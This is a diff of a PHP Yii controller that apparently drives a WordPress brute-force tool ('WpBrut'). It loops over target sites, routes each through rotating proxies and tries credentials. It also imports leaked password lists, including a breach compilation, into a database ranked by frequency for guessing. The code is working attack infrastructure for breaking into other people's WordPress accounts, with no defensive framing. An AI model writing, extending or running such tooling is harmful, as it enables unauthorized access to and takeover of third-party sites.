@@ -22,19 +22,29 @@ class WpController extends Controller
         return \Yii::$app->blog;
     }
 
+    /**
+     * for test curl -x 127.0.0.1:8101 https://2ip.ru/
+     */
     public function actionIndex(){
         $siteRepository = new SiteRepository();
         $proxyRepository = new ProxyRepository();
+        $first = true;
 
         $wpBrut = new WpBrut();
         while ( $site = $siteRepository->getAvailableSite() ){
-            if(!$siteRepository->setAccessesAttributes($site)){
-                $site->uncompleated();
-                continue;
+
+            if(!$first || !$site->password || !$site->login){
+                if(!$siteRepository->setAccessesAttributes($site)){
+                    $site->uncompleated();
+                    continue;
+                }
             }
+            $first = false;
+
 
             if(!$proxyRepository->setProxyAttributes($site)){
                 $site->uncompleated();
+                echo ' PROXY ' . PHP_EOL;
                 continue;
             }
             try{
@@ -45,34 +55,149 @@ class WpController extends Controller
 
                 $site->available();
             } catch (\Exception $e){
+                $first = true;
                 echo $e->getMessage() . PHP_EOL;
                 echo ' Exception Connect' . PHP_EOL;
                 $site->revert();
             }
-
-
-
         }
     }
 
-    public function actionLoadPass(){
-        $filePath = '/home/vlad/work_data/passwords/breachcompilation.txt';
-        $descriptor = fopen($filePath, 'r');
-        $c= 0;
-        \Yii::$app->db->createCommand('update password set weight=0')->execute();
+    //php yii  wp/load-pass 1242685
 
-        while (($string = fgets($descriptor)) !== false) {
-            $string = trim($string);
-            $affected = \Yii::$app->db->createCommand('update password set weight=weight+1 where password="' . $string .'"')->execute();
-            if(!$affected){
-                \Yii::$app->db->createCommand('insert into password(password, weight) values("' . $string . '", 1)')->execute();
-            }
-            $c++;
-            if(!($c%400)) {
-                echo $c . ': ' . $string . PHP_EOL;
-               // sleep(1);
-            }
+    public function actionLoadPass($line = 0){
+        $filePath = '/home/vlad/work_data/passwords/10-million-password-list-top-1000000.txt';
+        $passwordTbl = 'pass_10_m';
+        $file = new \SplFileObject($filePath, 'r');
+        $c= 0;
+        if(!$line){
+            echo 'SET 0' . PHP_EOL;
+          //  \Yii::$app->db->createCommand('update '.$passwordTbl.' set weight=0')->execute();
         }
-        fclose($descriptor);
+        $file->seek($line); // go to line 200
+
+        $partCnt = 0;
+        $partData = [];
+        while(!$file->eof()){
+            $string = trim($file->fgets());
+          //  echo $string ;
+            $string = mb_convert_encoding($string, 'UTF-8');
+            $partData[] = $string;
+
+            if($partCnt > 150){
+                try{
+                    $created = (new \yii\db\Query())->select(['id', 'password'])->from($passwordTbl)
+                        ->where(['password' => $partData])->all();
+                    $created = \yii\helpers\ArrayHelper::map($created, 'password', 'id');
+
+                    if(!empty($created)){
+                        \Yii::$app->db->createCommand('update '.$passwordTbl.' set weight=weight+1 where id in(' . implode(",", $created) . ')')->execute();
+                    }
+
+                    $insertData = [];
+                    foreach ($partData as $partDataKey => &$partDataElement){
+                        if(array_key_exists($partDataElement, $created)){
+                            unset($partData[$partDataKey]);
+                            continue;
+                        }
+                        $insertData[] = [$partDataElement, 1];
+                    }
+                    \Yii::$app->db->createCommand()->batchInsert($passwordTbl, ['password', 'weight'], $insertData)->execute();
+
+                } catch (\Exception $e){
+                    foreach ($partData as $partDataElement){
+                        try{
+                            $affected = \Yii::$app->db->createCommand('update '.$passwordTbl.' set weight=weight+1 where password=:string',
+                                [':string' => $partDataElement])->execute();
+                            if(!$affected){
+                                \Yii::$app->db->createCommand('insert into '.$passwordTbl.'(password, weight) values(:string, 1)',
+                                    [':string' => $partDataElement])->execute();
+                            }
+
+                        } catch (\Exception $e){
+
+                        }
+                    }
+                }
+
+
+                $partCnt = 0;
+                $partData = [];
+            }
+            $partCnt++;
+
+            $c++;
+            if(!($c%200)) {
+                echo ($line+$c) . ': ' . $string . PHP_EOL;
+                 sleep(1);
+            }
+            $file->next();
+
+        }
+
+        if(!empty($partData)){
+            $created = (new \yii\db\Query())->select(['id', 'password'])->from($passwordTbl)
+                ->where(['password' => $partData])->all();
+            $created = \yii\helpers\ArrayHelper::map($created, 'password', 'id');
+
+            if(!empty($created)){
+                \Yii::$app->db->createCommand('update '.$passwordTbl.' set weight=weight+1 where id in(' . implode(",", $created) . ')')->execute();
+            }
+
+            $insertData = [];
+            foreach ($partData as $partDataKey => &$partDataElement){
+                if(array_key_exists($partDataElement, $created)){
+                    unset($partData[$partDataKey]);
+                    continue;
+                }
+                $insertData[] = [$partDataElement, 1];
+            }
+            \Yii::$app->db->createCommand()->batchInsert($passwordTbl, ['password', 'weight'], $insertData)->execute();
+        }
+
+
+        /*while(!$file->eof()){
+            try{
+                $string = trim($file->fgets());
+                $string = mb_convert_encoding($string, 'UTF-8');
+                $affected = \Yii::$app->db->createCommand('update password set weight=weight+1 where password=:string',
+                    [':string' => $string])->execute();
+                if(!$affected){
+                    \Yii::$app->db->createCommand('insert into password(password, weight) values(:string, 1)',
+                        [':string' => $string])->execute();
+                }
+
+            } catch (\Exception $e){
+
+            }
+            
+            $c++;
+            if(!($c%200)) {
+            echo ($line+$c) . ': ' . $string . PHP_EOL;
+            // sleep(1);
+            }
+            $file->next();
+
+        }*/
+
+    }
+
+    public function actionLoadPassOrder($offset = 0){
+        if(!$offset){
+            \Yii::$app->db->createCommand('truncate password_order')->execute();
+        }
+
+        while($created = (new \yii\db\Query())->select(['password'])->from('password')
+            ->limit(100)->offset($offset)->orderBy('weight desc')->column()){
+            array_walk($created, function (&$item){
+                $item = [$item];
+            });
+          //  print_r($created);
+
+            \Yii::$app->db->createCommand()->batchInsert('password_order', ['password'], $created)->execute();
+
+            $offset+= count($created);
+            echo $offset . PHP_EOL;
+        }
     }
 }
